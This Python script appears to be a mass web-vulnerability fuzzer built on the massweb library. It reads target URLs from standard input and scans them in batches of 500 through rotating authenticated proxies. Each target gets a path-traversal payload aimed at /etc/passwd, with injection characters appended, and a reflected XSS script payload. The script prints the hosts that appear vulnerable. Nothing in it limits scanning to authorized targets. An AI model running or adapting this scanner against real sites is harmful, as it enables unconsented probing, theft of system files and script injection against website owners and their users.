#!/usr/bin/python

from urlparse import urlparse
import sys
from massweb.fuzzers.get_fuzzer import GetFuzzer

def get_proxy_list():

    proxies_raw = """
    ip:username:password
"""

    proxies_list = []
    for x in proxies_raw.split("\n"):
        x = x.strip()
        spl = x.split(":")
        ip = spl[0]
        port = spl[1]
        user = spl[2]
        pw = spl[3]
        val = "http://" + user + ":" + pw + "@" + ip + ":" + port
        _dic = {"http" : val}
        proxies_list.append(_dic)

    return proxies_list

def fuzz_and_print_results(gf):

    for r in gf.fuzz():

        try:
            if True in r.result_dic.values():
                print urlparse(r.fuzzy_target.url).netloc + "\t" + str(r)
        except:
            sys.stderr.write("Failed to fuzz a target!\n")

def create_fuzzer():

    sys.stderr.write("Creating new fuzzer")
    proxy_list = get_proxy_list()
    gfc = GetFuzzer(num_threads = 10, proxy_list = proxy_list)
    gfc.add_payload_from_string("../../../../../../../../../../../../../../../../../../../../etc/passwd#--'@!\\", check_type_list = ["mxi", "sqli", "xpathi", "trav", "osci"])
    gfc.add_payload_from_string('"><ScRipT>alert(31337)</ScrIpT>', check_type_list = ["xss"])
    return gfc

def mapper():

    simul_fuzz = 500
    c = 0
    gf = create_fuzzer()

    for line in sys.stdin:

        try:
            line = line.strip()
            sys.stderr.write("Adding target %s\n" % line)
            gf.add_target_from_url(line)
            c += 1

        except:
            sys.stderr.write("Failed to add line to targets!\n")

        if c == simul_fuzz:
            fuzz_and_print_results(gf)
            del gf.targets
            del gf.payloads
            del gf
            gf = create_fuzzer()
            c = 0

    if c > 0:
        fuzz_and_print_results(gf)

if __name__ == "__main__":

    mapper()

